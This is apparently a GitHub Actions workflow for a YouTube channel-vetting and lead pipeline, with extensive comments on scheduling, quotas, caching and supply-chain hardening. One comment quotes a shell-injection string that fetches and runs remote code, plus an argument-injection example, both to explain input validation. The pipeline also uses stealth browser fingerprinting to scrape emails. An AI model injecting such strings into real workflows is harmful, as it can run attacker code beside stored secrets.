name: Channel Vetting Pipeline

on:
  schedule:
    # 18:00 UTC = 02:00 Asia/Manila THE NEXT DAY (UTC+8, no DST, so this is
    # exact all year). Requested 2026-08-20: the operator runs on Philippine
    # time and wanted the run overnight rather than mid-morning.
    #
    # WEEKDAYS ONLY (1-5 = Mon-Fri). Rows are written for a human review queue,
    # so discovering on days nobody works just ages the leads and spends
    # influencers.club credits (~7 per run) against a table that will not be
    # touched until Monday.
    #
    # THIS SLOT RESTORES THE REVIEWERS' WEEK that the previous 01:30 UTC slot
    # gave up, which is why the DOW field is still 1-5 and not the 2-6 the old
    # comment here (and CLAUDE.md) prescribed as the fix. The day-of-week field
    # is evaluated in UTC, so what matters is whether 18:00 UTC lands on the
    # SAME calendar day in the two zones this pipeline pins. It does:
    #   - America/Toronto (PROSPECT_DAY_TZ, which stamps "Date Added" and
    #     drives the daily caps) is 14:00 EDT / 13:00 EST the same day. So a
    #     UTC Mon-Fri cron stamps its rows Mon-Fri in Toronto, and they land
    #     in the reviewers' early afternoon rather than after they log off.
    #     No more Sunday run.
    #   - America/Los_Angeles (the quota reset zone) is 11:00 PDT / 10:00 PST
    #     the same day — mid-morning in the Pacific quota day. Not the just-
    #     after-reset slot the old 09:00 UTC cron had, so a manual dispatch
    #     earlier the same Pacific morning still competes with it for the
    #     8000-unit ceiling. Each daily run is still in its own Pacific day.
    #
    # WHAT THIS COSTS instead: the MANILA week is Tue-Sat, not Mon-Fri. There
    # is a 02:00 Saturday run in Manila and no 02:00 Monday one. That is the
    # right trade — the weekday restriction exists for the review queue in
    # Toronto, and nobody is watching a 02:00 run either way. If the Manila
    # calendar is ever what has to line up instead, the DOW field goes to 0-4
    # (UTC Sun-Thu) and the Toronto Sunday-stamping problem comes straight
    # back with it.
    #
    # workflow_dispatch below is deliberately NOT restricted: a human choosing
    # to run on a Saturday is a decision, not a schedule.
    - cron: "0 18 * * 1-5"
  workflow_dispatch:
    inputs:
      test_mode:
        description: "Run in --test mode (1 keyword, 5 results)"
        type: boolean
        default: false
      use_playwright_stealth:
        description: "Enable the Playwright link-list email lookup (uncheck for a faster run)"
        type: boolean
        default: true
      days_back:
        description: "How far back to search, in days. Use 90 for a one-off backlog sweep against emptied tables; leave blank for the usual 7."
        type: string
        required: false
        default: ""

# Only ever ONE run of this pipeline at a time, repo-wide.
#
# Two concurrent runners are the single most likely way to blow the 10,000
# unit/day YouTube budget. Every guard in this pipeline is per-process or
# read-then-write: quota_tracker.py keeps its ledger in a local
# quota_log.json (one per runner, neither seeing the other's spend), and
# count_added_today() reads Airtable BEFORE either run has pushed anything.
# So a workflow_dispatch fired while the 18:00 cron is still going gives two
# runs that both read the same low "added today" count, both compute a FULL
# day's headroom, and both spend a full day's quota against it — up to 2x
# the daily row cap and 2x the quota.
#
# cancel-in-progress is deliberately FALSE. Cancelling mid-flight is the
# worst outcome available: the run would be SIGKILLed somewhere between
# spending search.list units and writing quota_log.json, and between
# pushing Airtable rows and having them counted, stranding both the quota
# ledger and the Airtable state. Queueing the second run behind the first
# costs nothing but wall-clock time; cancelling the first loses money.
concurrency:
  group: channel-vetting
  cancel-in-progress: false

# This job needs NO repo access whatsoever: it checks out public code,
# installs deps, and talks to Airtable + YouTube over HTTPS. It never
# pushes a commit, publishes a package, comments on a PR, or reads another
# repo. The default GITHUB_TOKEN scope is workflow- and repo-settings
# dependent and is still `contents: write` on plenty of older repos, so the
# token handed to this job is spelled out rather than inherited. That
# matters here more than usual because the job also holds AIRTABLE_TOKEN
# and YOUTUBE_API_KEY in env for the whole run: anything that manages to
# execute inside a step already has those, and there is no reason to hand
# it repo write on top.
permissions: {}

jobs:
  run-pipeline:
    runs-on: ubuntu-latest

    # A normal full run is minutes. With USE_PLAYWRIGHT_STEALTH on it is
    # ~40 candidates x several link probes, each with its own page load and
    # settle wait (SETTLE_TIMEOUT_MS), so the realistic ceiling is tens of
    # minutes — but a page that never settles, a hung Chromium, or a stalled
    # Airtable pagination loop has no internal deadline at all. Without this
    # the job would sit on a runner for GitHub's 6-hour default, and with
    # `cancel-in-progress: false` above it would also block every queued
    # run behind it for those 6 hours.
    timeout-minutes: 60

    # Identical for both run steps below, so it lives here rather than
    # being repeated (and kept in sync) twice.
    env:
      AIRTABLE_TOKEN: ${{ secrets.AIRTABLE_TOKEN }}
      AIRTABLE_BASE_ID: ${{ secrets.AIRTABLE_BASE_ID }}
      AIRTABLE_TABLE_HOME_THEATER: ${{ secrets.AIRTABLE_TABLE_HOME_THEATER }}
      AIRTABLE_TABLE_LIFESTYLE_SOFA: ${{ secrets.AIRTABLE_TABLE_LIFESTYLE_SOFA }}
      YOUTUBE_API_KEY: ${{ secrets.YOUTUBE_API_KEY }}
      # Email chain step 4. Absent, InfluencersClient.from_config() returns
      # an inert client and the step silently does nothing — which on CI is
      # exactly where it matters most, since the browser step below is the
      # one degraded by datacenter IP reputation. An unset secret is still a
      # valid configuration (the step just skips), so this is not gated.
      INFLUENCERS_API_KEY: ${{ secrets.INFLUENCERS_API_KEY }}
      # ON for scheduled runs, and overridable on a manual dispatch.
      #
      # `github.event.inputs` is NULL on a schedule event — a workflow_dispatch
      # input's `default:` does not apply to any other trigger. The previous
      # expression here compared that null against 'true', so scheduled runs
      # got `false` no matter what the input default said. Checking the event
      # name first is what actually makes the schedule pick it up.
      #
      # Caveat this does not fix: stealth patches browser fingerprints, not
      # datacenter IP reputation, and GitHub runners sit in Azure ranges
      # YouTube challenges hard. Turning it on makes the browser step RUN;
      # whether YouTube serves it real pages is a separate question the run
      # log now answers (main.py warns when the step was requested but the
      # browser could not start).
      USE_PLAYWRIGHT_STEALTH: ${{ github.event_name != 'workflow_dispatch' || inputs.use_playwright_stealth }}
      # Pinned so the runner (UTC) agrees with head office on the day.
      PROSPECT_DAY_TZ: America/Toronto

    steps:
      # Every action below is pinned to a full commit SHA, with the release
      # it corresponds to in the trailing comment. A tag like `@v4` is a
      # MUTABLE git ref: whoever controls the action's repo (or anyone who
      # compromises it) can retag it at any time and every run of this
      # workflow silently picks up the new code — inside a job that has
      # AIRTABLE_TOKEN and YOUTUBE_API_KEY sitting in env. A SHA cannot be
      # moved. Cost of the trade: Dependabot/Renovate (or a human) has to
      # bump these deliberately, which is the point.
      - name: Check out repo
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      - name: Set up Python
        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
        with:
          python-version: "3.12"

      # --require-hashes refuses to install any artifact whose sha256 is not
      # listed in requirements.txt, so a hijacked PyPI account or a
      # substituted mirror artifact fails the install instead of running
      # arbitrary code next to the tokens in env. See the header of
      # requirements.txt for how to regenerate the file — adding or bumping
      # ANY dependency without regenerating it will fail this step.
      - name: Install dependencies
        run: pip install --require-hashes -r requirements.txt

      # Persists quota_log.json / search_cache.json / external_handles_cache.json
      # across runs so a same-day manual re-run (workflow_dispatch) doesn't
      # lose track of quota already spent or re-search a keyword already
      # cached today. Not load-bearing for a once-daily schedule for the
      # first two — quota_tracker.py's own Pacific-Time day-keying is what
      # actually enforces the reset. external_handles_cache.json IS
      # load-bearing for run time even on a once-daily schedule: without it
      # every scheduled run re-paginates ~18k Airtable rows across the 4
      # external tables (external_dedupe.py) before any discovery starts.
      #
      # Split restore/save rather than one `actions/cache` step. The
      # combined step only saves on a SUCCESSFUL job, and the runs whose
      # spend you least want to forget are the failures: main.py exits 1
      # when fetch_blocklist() or the dedupe set can't be read, and by then
      # discovery may already have spent hundreds of units. The save step
      # below is `if: always()` for exactly that.
      #
      # NOT a store of record. A GitHub Actions cache is best-effort: it is
      # evicted after 7 idle days, and evicted least-recently-used once the
      # repo passes the 10GB cache cap, with no signal to the run that it
      # went missing. A run that comes up empty here behaves like a first
      # run — fresh ledger, cold caches — so treat this as an optimisation
      # and a courtesy, and rely on quota_tracker.py's Pacific-Time day key
      # plus Airtable's own "Date Added" counts for correctness.
      #
      # credit_log.json is the ONE path here with no correctness backstop
      # behind it, and that asymmetry matters. Quota self-heals (Google resets
      # nightly and the Pacific day key enforces it) and the row caps are
      # recomputed from Airtable's own "Date Added" every run — but credits are
      # money, spent at a vendor, with no independent record this pipeline can
      # read back. If this cache misses, credit_tracker starts from an empty
      # ledger and BOTH its ceilings silently authorise a fresh allowance. So a
      # cache miss here is fail-OPEN in the one place the ledger exists to fail
      # closed, and the ledger is a brake on a same-day re-run rather than a
      # guarantee. The durable fix is a shared remote ledger (or reading the
      # vendor's own balance, which the discovery response already reports as
      # credits_left — see InfluencerDiscovery.credits_left_reported); until
      # then, treat INFLUENCERS_MAX_CREDITS_PER_MONTH as advisory on CI and
      # check the vendor dashboard for the authoritative figure.
      - name: Restore quota + search + external-handles + credit cache
        uses: actions/cache/restore@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
        with:
          path: |
            quota_log.json
            search_cache.json
            external_handles_cache.json
            credit_log.json
          # The exact key intentionally never hits (github.run_id is unique
          # per run) — it exists so the SAVE step below always has a fresh,
          # unclaimed key to write to. A cache key is immutable once
          # written, so reusing a stable key would make every save after the
          # first a silent no-op. The restore-keys prefix is what actually
          # loads state: it takes the most recent cache whose key starts
          # with it.
          key: channel-vetting-state-${{ github.run_id }}
          restore-keys: |
            channel-vetting-state-

      # pip installs the playwright package but not the browser binary it
      # drives, so this is what makes browser_email.py functional at all.
      # --with-deps pulls the shared libraries a headless Chromium links
      # against on a bare ubuntu-latest runner.
      #
      # Gated on the resolved env var, NOT on github.event.inputs — that is
      # null on a schedule, so gating on it would skip this step on exactly
      # the runs that now have the browser step turned on. Missing Chromium
      # fails SOFT (BrowserEmailScraper.launch() returns an inert scraper),
      # so the symptom would have been zero browser-sourced emails and no
      # error at all.
      - name: Install Chromium for Playwright
        if: env.USE_PLAYWRIGHT_STEALTH == 'true'
        run: python -m playwright install --with-deps chromium

      # DAYS_BACK is empty on a schedule and on any dispatch that left the
      # box blank, in which case no --days-back flag is passed at all and
      # main.py falls back to DISCOVERY_DAYS_BACK (7). Deliberately not
      # given a non-empty default: a wide window is a one-off backlog
      # sweep, and making it the standing behaviour would have every daily
      # run re-reading the same already-consumed pool for 100 units a
      # keyword (see "Discovery window" in CLAUDE.md).
      #
      # The value reaches the shell through `env:` and NEVER through a
      # ${{ }} interpolation inside `run:`. Keep it that way: ${{ }} is
      # pasted into the script before bash sees it, so `"; curl evil | sh #`
      # in the input box would be executed. Via env: it is just a string in
      # a variable.
      #
      # env: alone is not sufficient, though. `$DAYS_BACK` is UNQUOTED in
      # the ${:+...} expansion, so bash word-splits it into separate argv
      # entries — an input of `7 --daily-cap 9999` would reach main.py as
      # three arguments and quietly override BOTH daily caps, spending a
      # day's quota and filling the tables past the row cap. That is
      # argument injection, not shell injection, and quoting alone would
      # only turn it into an argparse error at the far end. So the value is
      # validated as digits-only here and the run aborts before main.py is
      # invoked at all.
      #
      # Note the empty case is ACCEPTED, not rejected: blank is the normal
      # state on every scheduled run. Only a non-empty non-numeric value is
      # an error.
      - name: Run pipeline (full)
        if: github.event_name == 'schedule' || github.event.inputs.test_mode != 'true'
        env:
          DAYS_BACK: ${{ inputs.days_back }}
        run: |
          case "$DAYS_BACK" in
            "") ;;
            *[!0-9]*)
              echo "::error::days_back must be digits only (got: '$DAYS_BACK')"
              exit 1
              ;;
          esac
          python main.py ${DAYS_BACK:+--days-back "$DAYS_BACK"}

      # Same validation as the step above — duplicated rather than factored
      # into an earlier step on purpose, so neither run path can ever be
      # reached without it (a shared step could be skipped by an `if:` and
      # the guard would vanish silently).
      - name: Run pipeline (test mode)
        if: github.event.inputs.test_mode == 'true'
        env:
          DAYS_BACK: ${{ inputs.days_back }}
        run: |
          case "$DAYS_BACK" in
            "") ;;
            *[!0-9]*)
              echo "::error::days_back must be digits only (got: '$DAYS_BACK')"
              exit 1
              ;;
          esac
          python main.py --test ${DAYS_BACK:+--days-back "$DAYS_BACK"}

      # `if: always()` is the whole reason the cache step is split in two.
      # A failed run has usually already spent quota — main.py aborts with
      # SystemExit(1) when fetch_blocklist() or the external dedupe set
      # can't be read, and discovery runs before neither of those — so
      # dropping quota_log.json on failure is precisely the case where the
      # next run would re-spend from an apparently clean ledger.
      #
      # Placed last so it captures whatever the run steps wrote. Saving is
      # best-effort by design: a missing path or an unwritable cache logs a
      # warning and does not fail the job (see the "NOT a store of record"
      # note on the restore step).
      #
      # credit_log.json has the strongest claim of the four to being saved on a
      # FAILED run: an abort after discovery has paged means the money is gone
      # whether or not the run produced a row, and a ledger dropped there lets
      # the next run spend a second full allowance believing nothing was spent.
      - name: Save quota + search + external-handles + credit cache
        if: always()
        uses: actions/cache/save@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
        with:
          path: |
            quota_log.json
            search_cache.json
            external_handles_cache.json
            credit_log.json
          key: channel-vetting-state-${{ github.run_id }}
